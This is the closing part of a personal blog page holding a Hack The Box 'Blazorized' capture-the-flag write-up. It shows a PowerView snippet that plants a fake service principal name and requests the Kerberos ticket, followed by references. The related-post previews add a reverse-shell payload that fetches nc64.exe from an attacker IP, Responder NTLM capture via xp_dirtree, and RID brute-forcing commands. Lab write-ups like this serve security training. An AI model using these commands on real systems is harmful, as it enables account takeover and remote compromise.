+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$SecPassword = ConvertTo-SecureString &#x27;Password123!&#x27; -AsPlainText -Force</span><br><span class="line"></span><br><span class="line">$Cred = New-Object System.Management.Automation.PSCredential(&#x27;TESTLAB\\\dfm.a&#x27;, $SecPassword)</span><br><span class="line"></span><br><span class="line">Set-DomainObject -Credential $Cred -Identity harmj0y -SET @&#123;serviceprincipalname=&#x27;nonexistent/BLAHBLAH&#x27;&#125;</span><br><span class="line"></span><br><span class="line">Get-DomainSPNTicket -Credential $Cred harmj0y | fl</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2024/11/09/htb-blazorized.html#shell-as-rsa_4810">https://0xdf.gitlab.io/2024/11/09/htb-blazorized.html#shell-as-rsa_4810</a></li>
+<li><a target="_blank" rel="noopener" href="https://benheater.com/hackthebox-blazorized/">https://benheater.com/hackthebox-blazorized/</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_22792465/article/details/140143152">https://blog.csdn.net/qq_22792465/article/details/140143152</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52742680/article/details/140102307?spm=1001.2014.3001.5502">https://blog.csdn.net/m0_52742680/article/details/140102307?spm=1001.2014.3001.5502</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/05/23/HTB-H-Blazorized/">http://example.com/2025/05/23/HTB-H-Blazorized/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HTB/">HTB</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/05/23/HTB-M-Administrator/" title="HTB-M-Administrator"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">HTB-M-Administrator</div></div><div class="info-2"><div class="info-item-1">HTB-Administrator 开局败给个账户 GenericAll权限改别人密码 smb文件藏密码 ADCS提权  一 用Linux打GenericAll apt install -y heimdal-clients libsasl2-modules-gssapi-heimdal vim .&#x2F;custom_krb5.conf 123456789101112131415[libdefaults]    default_realm = ADMINISTRATOR.HTB    dns_lookup_realm = true    dns_lookup_kdc = true[realms]    ADMINISTRATOR.HTB = &#123;        kdc = dc.administrator.htb        admin_server = dc.administrator.htb        default_domain = dc.administrator.htb    &#125;[domain_realm]   ...</div></div></div></a><a class="pagination-related" href="/2025/05/23/2025palu%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%BB%E7%BA%BF/" title="2025palu应急响应主线.md"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">2025palu应急响应主线.md</div></div><div class="info-2"><div class="info-item-1">2025palu应急响应主线 1-提交堡垒机中留下的flag最开始我以为这个堡垒机应该是waf机子，因为他这个分布图是在waf挨着互联网出口，后来发现是jump机子做跳板机（堡垒机），也不能这么说，他这整个网络都是外网段的 ss -tuln  80端口开启着服务 算了，账号密码给了，登录就送  2-waf中的flag雷池waf  3-数据库中的flag 数据库开着，但是没mysql  4-提交攻击者的攻击IP&#x2F;var&#x2F;log&#x2F;auth.log 解压.2的gz文件然后就能看到  5-攻击者最早攻击时间 6-web服务泄露的关键文件名 7-泄露的邮箱地址 8-攻击者新立足点waf85页能看到攻击者使用的IP开始切换了  9-攻击者提权用户 可以看到后门用户，那么就john，我这不太好使，john缺模块  10-提交攻击者留下的的文件内容作为flag提交 11-提交权限维持方法服务的名称ssh机子存在服务开机自启一个文件  systemctl status rootset.service   12-...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/05/23/HTB-M-Escape/" title="HTB-M-Escape"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-Escape</div></div><div class="info-2"><div class="info-item-1">HTB-M-Escape讲的是ADCS-ESC1+MSSQL数据库引起的ntlm窃取+smb信息泄露 信息收集dns没搜集到有用信息 1dig any sequel.htb   smb试试存在RID,收集用户信息作为保存  smb空密码连接有文件  pdf里有个数据库的账户密码，还有几个内部人员姓名  进入数据库查询一下 1SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = &#x27;spt_fallback_db&#x27;;  1SELECT TOP 10 * FROM spt_fallback_db;  没查询到有用信息，也没权限命令执行，于是采用中间人攻击 在开启python3 Responder.py -I tun0 然后用数据库 读取我主机的共享文件 1EXEC xp_dirtree &#x27;\\10.10.16.14\share&#x27;, 1,...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-M-Jab/" title="HTB-M-Jab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-Jab</div></div><div class="info-2"><div class="info-item-1">HTB-Jab扫描端口服务利用 XMPP - 5269, 5270（tcp下载客户端 XMPP 是一个“通用消息标准”。它允许“XMPP 兼容的软件加入 XMPP 消息网络”  先创建，新建一个用户，使用，在利用插件Service Discovery 来进行那个信息收集 可以看到还有三个子域名 然后点击list的用户的查找用户这，顺便开启插件控制台 123456789&lt;iq type=&#x27;set&#x27;     from=&#x27;ddl1@jab.htb&#x27;    to=&#x27;search.jab.htb&#x27;    id=&#x27;search4users&#x27;    xml:lang=&#x27;en&#x27;&gt;	&lt;query xmlns=&#x27;jabber:iq:search&#x27;&gt;       ...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-M-Manager/" title="HTB-M-Manager"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-Manager</div></div><div class="info-2"><div class="info-item-1">HTB-M-Manager RID攻击 ADCS提权  扫扫先扫一波，有web服务就去看看 测试一下功能点 貌似没xss 扫扫ldap端口,没有连接不让扫  扫扫smb  这种需要身份验证，但是假用户也能得到部分验证 可以尝试 RID 循环攻击1impacket-lookupsid dll@manager.htb -no-pass  输出中 : 前的数字是 RID 直接提取用户 1| grep SidTypeUser | cut -d&#x27; &#x27; -f2 | cut -d&#x27;\&#x27; -f2 | tr &#x27;[:upper:]&#x27; &#x27;[:lower:]&#x27; | tee users  可以以使用netexec1netexec smb 10.10.11.236 -u guest -p &#x27;&#x27; --rid-brute  之后测试一下那个有没有用户名账号密码一样的 1netexec smb manager.htb -u users -p users --continue-on-success...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-M-Outdated/" title="HTB-M-Outdated"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-Outdated</div></div><div class="info-2"><div class="info-item-1">HTB-M-Outdated讲的是一个CVE的钓鱼，还有一个WSUS的提权+AddKeyCredentialLink的横移  扫端口， smb匿名登录存在文件泄露pdf文件中存在在邮箱账户，以及几个CVE需要修补的 然后利用 存在RID但是我没有进行后续的信息收集，钓鱼攻击CVE-2022-30190编写脚本12345678910111213141516171819202122#!/usr/bin/env python3import base64import randomimport stringimport sysif len(sys.argv) &gt; 1:    command = sys.argv[1]else:    command = &quot;IWR http://10.10.16.14/nc64.exe -outfile C:\\programdata\\nc64.exe; C:\\programdata\\nc64.exe 10.10.16.14 443 -e cmd&quot;base64_payload =...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-M-Pov/" title="HTB-M-Pov"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-Pov</div></div><div class="info-2"><div class="info-item-1">HTB-M-Pov讲的是  根据 web.config 中的文件泄露，构造发送这恶意 viewstate，来执行命令 一个账号密码文件泄露 SeDebugPirvilege的提权（就是有进程迁移进入系统权限  子域名爆破1ffuf -u http://10.10.11.251 -H &#x27;HOST: FUZZ.pov.htb&#x27; -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -ac   爆破文件 1./gobuster -t 15 --delay 100ms dir -e -u &quot;http://dev.pov.htb/portfolio&quot; -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x...</div></div></div></a><a class="pagination-related" href="/2025/05/23/HTB-M-SolarLab/" title="HTB-M-SolarLab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-23</div><div class="info-item-2">HTB-M-SolarLab</div></div><div class="info-2"><div class="info-item-1">HTB-M-SolarLab 账户名的模糊猜测 PeportLab的CVE复现 Openfire脚本中提取账号密码  扫一扫  试探smb 可以用来打RID  1netexec smb 10.10.11.16 -u guest -p &#x27;&#x27; --rid-brute  然后就是  下载xlsx文件  1netexec smb solarlab.htb -u u.txt -p...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">师傅加个联系方式，讨论交流学习，若有不足还请师父指出</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-Blazorized"><span class="toc-number">1.</span> <span class="toc-text">HTB-Blazorized</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%87%BA%E7%96%91%E9%97%AE"><span class="toc-number">1.0.1.</span> <span class="toc-text">提出疑问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%BF%E5%91%8A"><span class="toc-number">1.0.2.</span> <span class="toc-text">广告</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E7%BB%AD"><span class="toc-number">1.0.3.</span> <span class="toc-text">继续</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.0.4.</span> <span class="toc-text">后台命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97shell-nu-1055"><span class="toc-number">1.1.</span> <span class="toc-text">获得shell-&gt;nu_1055</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A81-rsa-4810"><span class="toc-number">1.2.</span> <span class="toc-text">横向移动1-&gt;rsa_4810</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A82-ssa-6010"><span class="toc-number">1.3.</span> <span class="toc-text">横向移动2-&gt;ssa_6010</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E4%B8%8B%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7"><span class="toc-number">1.3.1.</span> <span class="toc-text">检查下一个用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E6%A3%80%E6%9F%A5%E5%8F%AF%E5%86%99%E7%9B%AE%E5%BD%95"><span class="toc-number">1.3.2.</span> <span class="toc-text">然后检查可写目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%86%99%E7%A0%81"><span class="toc-number">1.3.3.</span> <span class="toc-text">然后写码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E6%88%90%E5%91%98%E5%B1%9E%E6%80%A7%E8%B5%8B%E5%80%BC"><span class="toc-number">1.3.4.</span> <span class="toc-text">给成员属性赋值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0DCSync-administrator"><span class="toc-number">1.4.</span> <span class="toc-text">本地DCSync-&gt;administrator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.5.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/23/HTB-M-SolarLab/" title="HTB-M-SolarLab">HTB-M-SolarLab</a><time datetime="2025-05-23T12:58:09.000Z" title="Created 2025-05-23 20:58:09">2025-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/23/HTB-M-Pov/" title="HTB-M-Pov">HTB-M-Pov</a><time datetime="2025-05-23T12:57:57.000Z" title="Created 2025-05-23 20:57:57">2025-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/23/HTB-M-Outdated/" title="HTB-M-Outdated">HTB-M-Outdated</a><time datetime="2025-05-23T12:55:16.000Z" title="Created 2025-05-23 20:55:16">2025-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/23/HTB-M-Manager/" title="HTB-M-Manager">HTB-M-Manager</a><time datetime="2025-05-23T12:55:03.000Z" title="Created 2025-05-23 20:55:03">2025-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/23/HTB-M-Jab/" title="HTB-M-Jab">HTB-M-Jab</a><time datetime="2025-05-23T12:54:38.000Z" title="Created 2025-05-23 20:54:38">2025-05-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
+      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      visitor: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
